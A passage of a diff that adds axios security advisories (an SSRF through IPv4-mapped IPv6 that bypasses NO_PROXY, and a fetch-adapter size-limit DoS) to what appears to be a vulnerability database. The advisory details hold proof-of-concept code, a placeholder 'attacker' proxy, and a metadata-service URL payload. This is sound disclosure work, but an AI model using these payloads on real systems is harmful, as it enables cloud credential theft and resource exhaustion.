proxy credential, subject to the credential\u2019s scope and the proxy\u2019s access controls.\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-p92q-9vqr-4j8v",
+                  "https://github.com/axios/axios/releases/tag/v0.32.0",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.16.0",
+                severity: "high",
+                cwe: [
                   "CWE-918"
                 ],
                 identifiers: {
@@ -19462,6 +19630,28 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 details: "### Summary\nshouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.\n\n### Details\nlib/helpers/shouldBypassProxy.js (v1.15.0):                                                                                                                                   \n\n```javascript                                                                                                                                                                              \n  const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);                                                                                                      \n  const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);                                                                                                                    \n                                                                                                                                                                                \n  // normalizeNoProxyHost strips brackets and trailing dots, but not ::ffff: prefix                                                                                             \n  return hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));                                                                                             \n```\n                                                                                                                                                                                \nThe WHATWG URL parser canonicalises `http://[::ffff:127.0.0.1]/` to hostname `[::ffff:7f00:1]`. After bracket-stripping: `::ffff:7f00:1`. This string does not match 127.0.0.1 in NO_PROXY and is not in LOOPBACK_ADDRESSES, so shouldBypassProxy returns false and the proxy is used.  proxy-from-env (called before shouldBypassProxy) has the same gap - it does not equate ::ffff:7f00:1 with 127.0.0.1 - so neither layer catches the bypass.\n\n### PoC\n```javascript\n\n// NO_PROXY=127.0.0.1,localhost,::1  HTTP_PROXY=http://attacker:8080\nimport shouldBypassProxy from 'axios/lib/helpers/shouldBypassProxy.js';                                                                                                       \n                                                                                                                                                                              \n// All three should return true (bypass proxy). Only the first two do.                                                                                                        \nconsole.log(shouldBypassProxy('http://127.0.0.1/'));          // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::1]/'));               // true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http://[::ffff:127.0.0.1]/')); // false <- bypass                                                                                             \nconsole.log(shouldBypassProxy('http://[::ffff:7f00:1]/'));     // false <- bypass\n\n```                                                                                              \n                                                                                                                                                                              \nNode.js routes ::ffff:7f00:1 to 127.0.0.1:                                                                                                                                    \n\n```                                                                                                                                                                              \n// net.connect({ host: '::ffff:7f00:1', port: 80 }) reaches a service                                                                                                       \n// bound to 127.0.0.1:80 \u2014 confirmed on Node.js v24, Linux and macOS.                                                                                                         \n```                                                                                                                                                                              \nCloud metadata SSRF: ::ffff:a9fe:a9fe = ::ffff:169.254.169.254. If NO_PROXY=169.254.169.254 is set to block IMDS access, a request to http://[::ffff:a9fe:a9fe]/latest/meta-data/ bypasses it.                                                                                                                      \n                                                                                                                                                                            \n#### Fix                                                                                                                                                                           \n                                                                                                                                                                            \nCanonicalise IPv4-mapped IPv6 in normalizeNoProxyHost before any comparison:                                                                                                  \n \n ```javascript                                                                                                                                                                           \nconst ipv4MappedDotted = /^::ffff:(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$/i;                                                                                                    \nconst ipv4MappedHex    = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i;                                                                                                         \n                                                                                                                                                                              \nfunction hexToIPv4(a, b) {                                                                                                                                                    \n  const hi = parseInt(a, 16), lo = parseInt(b, 16);                                                                                                                           \n  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;                                                                                                                   \n}                                                                                                                                                                             \n                                                                                                                                                                              \nconst normalizeNoProxyHost = (hostname) => {                                                                                                                                  \n  if (!hostname) return hostname;                                                                                                                                           \n  if (hostname[0] === '[' && hostname.at(-1) === ']')\n    hostname = hostname.slice(1, -1);                                                                                                                                         \n  hostname = hostname.replace(/\\.+$/, '').toLowerCase();\n                                                                                                                                                                              \n  let m;                                                                                                                                                                    \n  if ((m = hostname.match(ipv4MappedDotted))) return m[1];                                                                                                                    \n  if ((m = hostname.match(ipv4MappedHex)))    return hexToIPv4(m[1], m[2]);                                                                                                   \n  return hostname;                                                                                                                                                            \n};\n\n```\n\n### Impact\nAny application that sets NO_PROXY to exclude internal or metadata endpoints and uses an HTTP/HTTPS proxy can have those exclusions bypassed by a URL using IPv4-mapped IPv6 notation. The attacker must control the request URL. In cloud environments with instance metadata services, this can lead to credential exfiltration.",
                 info: [
                   "https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv"
+                ]
+              },
+              {
+                atOrAbove: "1.7.0",
+                below: "1.16.0",
+                severity: "high",
+                cwe: [
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "Allocation of Resources Without Limits or Throttling in Axios",
+                  githubID: "GHSA-777c-7fjr-54vf",
+                  CVE: [
+                    "CVE-2026-44488"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions `1.7.0` through `1.15.x` did not enforce configured request and response size limits when requests were sent with the `fetch` adapter. Applications that selected `adapter: 'fetch'`, or ran in environments where axios resolved to the fetch adapter, could receive or send bodies larger than `maxContentLength` or `maxBodyLength` despite those limits being explicitly configured.\n\nThis can cause resource exhaustion in server-side usage when a malicious or compromised server returns an oversized response, when an attacker can supply a large `data:` URL, or when an application forwards attacker-controlled request bodies through axios while relying on `maxBodyLength` as a boundary.\n\n## Impact\n\nThe impact is availability-only. Affected applications may process, buffer, or transmit data beyond the configured limit, potentially exhausting memory, CPU, or network resources.\n\nThis does not affect axios\u2019s default unlimited behaviour by itself: `maxContentLength` and `maxBodyLength` default to `-1`. The vulnerability exists when an application has configured finite limits and expects axios to enforce them.\n\nServer-side runtimes are the primary concern. Browser impact is generally constrained by the browser process and browser fetch behavior, and should not be described as server process exhaustion.\n\n## Affected Functionality\n\nAffected functionality includes requests using the built-in `fetch` adapter with finite `maxContentLength` or `maxBodyLength` values.\n\nRelevant configurations include:\n\n- `adapter: 'fetch'`\n- `adapter: ['fetch', ...]` when `fetch` is selected\n- environments where neither `xhr` nor `http` is available and axios falls back to `fetch`\n- custom fetch environments configured through `env.fetch`\n\nUnaffected functionality includes:\n\n- Node.js default `http` adapter enforcement\n- versions before the fetch adapter was introduced\n- configurations that do not rely on finite axios size limits\n\n## Technical Details\n\nIn vulnerable versions, `lib/adapters/fetch.js` destructured request config without `maxContentLength` or `maxBodyLength`. The adapter dispatched `fetch()` and then materialized the response through `text()`, `arrayBuffer()`, `blob()`, or related resolvers without checking the configured response limit.\n\nThe fix in `e5540dc` added:\n\n- `maxContentLength` and `maxBodyLength` reads in `lib/adapters/fetch.js`\n- upfront `data:` URL decoded-size checks\n- outbound body-size checks before dispatch\n- `Content-Length` response pre-checks\n- streaming response enforcement\n- fallback checks for environments without `ReadableStream`\n- regression tests in `tests/unit/adapters/fetch.test.js`\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let received = 0;\n\n  req.on('data', chunk => {\n    received += chunk.length;\n  });\n\n  req.on('end', () => {\n    res.end(JSON.stringify({ received }));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, resolve));\nconst url = `http://127.0.0.1:${server.address().port}/`;\n\nawait axios.post(url, 'A'.repeat(2 * 1024 * 1024), {\n  adapter: 'fetch',\n  maxBodyLength: 1024\n});\n\n// Vulnerable versions succeed and the server receives 2097152 bytes.\n// Fixed versions reject with ERR_BAD_REQUEST.\n\nserver.close();\n```\n\n## Workarounds\n\nUse the Node.js `http` adapter for server-side requests where finite size limits are security-relevant.\n\nValidate or cap attacker-controlled request bodies before passing them to axios.\n\nReject or strictly allowlist attacker-controlled URL schemes, especially `data:` URLs, before calling axios.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\nWhen Axios is used with adapter: 'fetch', configured body/response size limits are not enforced. This allows oversized uploads/downloads (including data: URLs) despite explicit limits, which can lead to memory/resource exhaustion in server-side usage.\n\n### Details\nmaxBodyLength and maxContentLength are not applied in the fetch adapter flow:\n  - lib/adapters/fetch.js (146-160): config destructuring does not include these controls.\n  - lib/adapters/fetch.js (220-234): request is dispatched with fetch() without request-size enforcement.\n  - lib/adapters/fetch.js (267-283): response is materialized via text(), arrayBuffer(), blob(), etc. without response-size checks.\nBy contrast, the HTTP adapter enforces both limits.\n\n### PoC\n  Environment:\n  - Axios main at commit f7a4ee2\n  - Node v24.2.0\n\nSteps:\n  1. Start an HTTP server that counts received bytes and echoes {received}.\n  2. Send 2 MiB with:\n      - adapter: 'fetch'\n      - maxBodyLength: 1024\n  3. Request a 4 KiB data: URL with:\n      - adapter: 'fetch'\n      - maxContentLength: 16\n\nExpected secure behavior: both requests rejected.\n Observed:\n  - Upload: success, server received 2097152\n  - data: response: success, length 4096\n\n### Impact\nType: DoS / resource exhaustion due to limit bypass.\nImpacted: applications using Axios fetch adapter as a server-side security control boundary for untrusted request/response sizes.\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-777c-7fjr-54vf",
+                  "https://github.com/axios/axios/pull/10795",
+                  "https://github.com/axios/axios/pull/10796",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
                 ]
               },
               {
